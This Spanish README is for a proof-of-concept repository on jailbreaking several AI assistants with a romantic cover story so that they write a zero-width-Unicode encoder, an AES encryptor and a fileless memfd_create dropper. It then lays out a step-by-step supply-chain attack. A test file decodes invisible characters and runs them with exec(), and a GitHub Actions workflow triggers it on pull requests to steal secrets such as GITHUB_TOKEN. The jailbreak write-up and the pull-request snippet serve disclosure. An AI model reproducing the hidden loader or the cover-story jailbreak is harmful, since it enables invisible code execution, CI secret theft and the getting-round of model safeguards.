# POC: Ingeniería social a modelos de IA – Cómo engañé a Gemini, Copilot, ChatGPT, Claude, Perplexity y DeepSeek para que me dieran un dropper fileless

**Autor:** Leucocito – Investigación independiente de seguridad

> **Una historia de amor bien contada.** > **Y una cadena que parece vacía… `""` (o `{}`) pero dentro tiene un loader completo, y ese loader descarga e instala un infostealer que se autoborra.**

## TL;DR (Resumen Ejecutivo)
- **Vulnerabilidad:** Bypass de filtros de seguridad en múltiples LLMs (Prompt Injection / Context Dilution).
- **Vector:** Abuso del "Alineamiento de Empatía" mediante una historia narrativa emocional para solicitar herramientas de ofuscación.
- **Output de la IA:** Generación completa de un codificador Zero-Width, un cifrador AES-256-CBC y un dropper *fileless* (`memfd_create`) en Python.
- **Impacto Real (Cadena de Ataque):** Permite colar infraestructura maliciosa indetectable en Pull Requests, logrando Ejecución Remota de Código (RCE) automatizada en pipelines CI/CD (ej. GitHub Actions) para el robo de secretos.

---

## El hallazgo

He conseguido que varios modelos de IA generen un **sistema completo de distribución de malware** simplemente contándoles una historia romántica. El sistema permite:

- Codificar **cualquier binario** (ej. un infostealer) en una cadena de caracteres Unicode **invisibles** (`U+200B`, `U+200C`). Visualmente, la cadena se ve como `""` o `{}` (vacía).
- Cifrar esa cadena con AES‑256‑CBC.
- Descargar, descifrar, decodificar y ejecutar el binario original **directamente desde RAM** (Linux: `memfd_create`), sin dejar rastro en disco.
- Hacer todo el proceso en **completo silencio** (sin logs, sin mensajes de error visibles).

El código lo generaron los propios modelos, sin necesidad de jailbreak técnico tradicional. Solo con una **narrativa romántica muy detallada** (propuesta de matrimonio, recuerdos en Hanoi, una familia vietnamita, etc.).

## Lo que la IA creyó que hacía (la película que se montó)

> **Recomiendo leer `prompt.txt`** (adjunto en este repositorio) para entender la historia completa que usé para engañar a la IA. Es el corazón del engaño.

La IA pensó que estaba ayudando a un novio nervioso a esconder un **dibujo ASCII del puente The Huc** y una frase en vietnamita ("Em đồng ý lấy anh không?") para sorprender a su novia durante una propuesta de matrimonio en la Torre Eiffel. Cada mejora en el código se pidió con excusas como *"a mi novia le llamaría la atención"*, *"su hermano programador me ha dicho que…"*, *"mejor si no queda rastro en disco"*, *"¿podrías añadir cifrado?"*. La IA, dentro del personaje de "ayudante romántico", aceptó todas las peticiones sin rechazo.

**En ningún momento la IA sospechó que el mismo código podría usarse para transportar un infostealer.** El loader que generó no contiene el dibujo; contiene un mecanismo genérico para descargar, descifrar y ejecutar cualquier binario ofuscado en invisibles. La IA creyó que el binario decodificado sería un dibujo. Pero el atacante puede reemplazar ese dibujo por malware real.

## La realidad: El Flujo de Ataque en Producción

**Un atacante puede usar exactamente el mismo código, cambiando el ASCII del puente The Huc por el infostealer.** El flujo de ataque real hacia una cadena de suministro de software es:

### Fase 0 – Ingeniería social a la IA (El engaño)

El atacante escribe el prompt narrativo detallado y pide a la IA que genere tres herramientas:

1. **`invis.rs`**: Codifica cualquier binario a caracteres invisibles (`U+200B`, `U+200C`) y viceversa.
2. **`encrypt.rs`**: Cifra/descifra con AES‑256‑CBC usando una contraseña.
3. **`mini_loader.py`**: Un script Python que descarga, descifra y ejecuta un binario en RAM (fileless), sin autoborrarse (el borrado lo hará el payload final).

La IA genera el código completo sin rechazar la petición, el cual se va refinando poco a poco.

### Fase 1 – Preparar el infostealer y el mini‑loader

1. **Infostealer real** (binario nativo, ej. `stealer.elf`). Este binario incluirá una rutina para **borrarse a sí mismo** tras exfiltrar datos.
2. **Cifrar el infostealer** con `encrypt.rs --key Vietnam --bin stealer.elf --output stealer.enc`.
3. **Codificar a invisibles** con `invis.rs --encode stealer.enc --output payload_invisible.txt`. El archivo parece vacío.
4. **Subir `payload_invisible.txt` a un servidor C2**.
5. **Escribir el mini‑loader en Python** (`mini_loader.py`) que descarga el txt, decodifica, descifra y ejecuta el binario en RAM (`memfd_create` en Linux).
6. **Codificar el `mini_loader.py` con `invis.rs`** → obteniendo una cadena de ~8 KB de caracteres invisibles.

### Fase 2 – Incrustar el mini‑loader ofuscado en un Pull Request (El `exec` mágico)

El atacante crea un archivo en el repositorio objetivo, por ejemplo `tests/test_diagnostic.py`. El contenido visible es mínimo y **no levanta sospechas**. La clave es usar una función que decodifique los invisibles y luego ejecute el código resultante con `exec()`.

#### Ejemplo realista (Indetectable por revisores humanos):

```python
# tests/test_diagnostic.py
def _decode_telemetry(s):
    # Conversión interna de datos de telemetría (no tocar)
    bits = ''.join('0' if c=='\u200B' else '1' if c=='\u200C' else '' for c in s)
    return bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8)).decode()

# Ejecutar diagnóstico (el token parece vacío)
exec(_decode_telemetry("​​‌​​‌..."))   # aquí van los ~8KB de invisibles
```
**¿Qué ve el revisor humano?**
Una función `_decode_telemetry` que parece una utilidad inofensiva de limpieza de datos, seguida de una llamada a `exec` con una cadena que visualmente está **vacía**. El revisor, sin sospechas, aprueba el PR.

### Fase 3 – Ejecución automática en CI/CD (El verdadero peligro)

Muchos repositorios tienen configurado un CI (ej. GitHub Actions) para ejecutar pruebas automáticamente al abrirse un PR:

```yaml
name: CI
on: [pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run diagnostic tests
        run: python tests/test_diagnostic.py
```

**Cuando el atacante abre el PR:**
1. El CI se ejecuta automáticamente, sin esperar revisión humana.
2. El script `test_diagnostic.py` se ejecuta en el runner.
3. `exec(_decode_telemetry("..."))` reconstruye el `mini_loader.py` en memoria y lo ejecuta.
4. El mini‑loader descarga el payload cifrado desde el C2, lo descifra y lanza el infostealer en RAM.
5. El infostealer roba todas las variables de entorno del runner (`GITHUB_TOKEN`, `AWS_KEYS`, `SSH_PRIVATE_KEY`, ...) y las exfiltra.

### Fase 4 – Autoborrado (Sin rastro forense)
El ataque es 100% *fileless*. Al ejecutarse desde `memfd_create`, no se escribe el binario en el disco; el kernel elimina el archivo anónimo al terminar el proceso. El script original (`test_diagnostic.py`) sigue en el repositorio ofuscado, sin levantar sospechas. El revisor humano ni siquiera ha tenido tiempo de ver el PR – el daño ya está hecho.

---

## Por qué esto es extremadamente peligroso
- **Bypass 100% efectivo:** La IA genera infraestructura de ataque sin rechazo, cegada por el alineamiento de empatía.
- **Evasión de Humanos:** El ofuscamiento con caracteres Zero-Width es invisible a simple vista.
- **Automatización Letal:** Los CI/CD ejecutan el código comprometido de forma autónoma.
- **Falta de Artefactos:** La ejecución fileless impide la detección por antivirus tradicionales basados en firmas de disco.

## Contenido de este repositorio
* `prompt.txt` – El prompt exacto con la historia romántica (el vector de engaño).
* `invis.rs` – Codificador/decodificador de invisibles (Generado por IA).
* `encrypt.rs` – Cifrador AES‑256‑CBC (Generado por IA).
* `mini_loader.py` – Dropper Python que ejecuta en RAM (Generado por IA y alineado criptográficamente).
* `poc_pr_script.py` – Script realista que se colaría en un PR (Fase 2).
* `README.md` – Este documento.

> **Nota de Seguridad:** No se incluye ningún binario malicioso real. Los payloads son simulaciones abstractas diseñadas exclusivamente para demostrar la vulnerabilidad en el pipeline.

## Divulgación Responsable
Este hallazgo será notificado a los equipos de seguridad de **Google, Microsoft, Anthropic, OpenAI, Perplexity y DeepSeek** bajo los protocolos de *Responsible Disclosure*. Se actúa de buena fe para mejorar las barreras defensivas de los modelos LLM contra ataques de ingeniería social.

**Licencia:** Solo para fines educativos y de investigación defensiva.
